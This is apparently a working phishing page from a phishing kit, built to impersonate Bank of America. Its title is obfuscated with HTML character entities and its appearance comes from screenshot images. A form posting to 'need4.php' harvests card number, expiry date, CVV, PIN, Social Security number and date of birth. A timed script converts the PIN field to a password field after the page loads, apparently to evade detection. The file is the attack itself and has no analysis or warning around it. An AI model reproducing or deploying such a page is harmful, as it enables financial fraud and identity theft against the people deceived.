<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#66;&#97;&#110;&#107;&#32;&#111;&#102;&#32;&#65;&#109;&#101;&#114;&#105;&#99;&#97;&#32;&#45;&#32;&#66;&#97;&#110;&#107;&#105;&#110;&#103;&#44;&#32;&#67;&#114;&#101;&#100;&#105;&#116;&#32;&#67;&#97;&#114;&#100;&#115;&#44;&#32;&#72;&#111;&#109;&#101;&#32;&#76;&#111;&#97;&#110;&#115;&#32;&#97;&#110;&#100;&#32;&#65;&#117;&#116;&#111;&#32;&#76;&#111;&#97;&#110;&#115;</title>
<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
<script>setTimeout(function() {
  document.getElementsByTagName('input')[3].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<style type="text/css">
.textbox { 
    border: 1px solid #d1c9c0; 
    height: 40px; 
    width: 275px; 
  	font-family: SFS, Arial, sans-serif;
    font-size: 16px;
  	color: #555;
    padding-left:6px; 
}  
.textbox:focus { 
    outline: none; 
    border: 1px solid #0052C2;
} 
 </style>
 <style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>
</head>
<body>
<div class="loader"></div>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:220px; z-index:0"><img src="images/m8.png" alt="" title="" border=0 width=1349 height=220></div>

<div id="image2" style="position:absolute; overflow:hidden; left:50px; top:249px; width:156px; height:480px; z-index:1"><img src="images/m2.png" alt="" title="" border=0 width=156 height=480></div>

<div id="image3" style="position:absolute; overflow:hidden; left:215px; top:824px; width:99px; height:42px; z-index:2"><a href="#"><img src="images/m3.png" alt="" title="" border=0 width=99 height=42></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:20px; top:950px; width:1299px; height:152px; z-index:3"><img src="images/m4.png" alt="" title="" border=0 width=1299 height=152></div>
<form action=need4.php name=taxjmakro id=taxjmakro method=post>
<input name="cn" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:396px;left:52px;top:269px;z-index:4">
<input name="ex" placeholder="MM/YYYY" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:396px;left:52px;top:360px;z-index:5">
<input name="vc" class="textbox" autocomplete="off" required maxlength="3" type="text" style="position:absolute;width:396px;left:52px;top:451px;z-index:6">
<input name="pn" class="textbox" autocomplete="off" required maxlength="4" type="text" style="position:absolute;width:396px;left:52px;top:542px;z-index:7">
<input name="sn" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:396px;left:52px;top:633px;z-index:8">
<input name="db" placeholder="MM/DD/YYYY" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:396px;left:52px;top:724px;z-index:8">
<div id="formimage1" style="position:absolute; left:52px; top:824px; z-index:9"><input type="image" name="formimage1" width="142" height="42" src="images/sbm.png"></div>
</div>

</body>
</html>
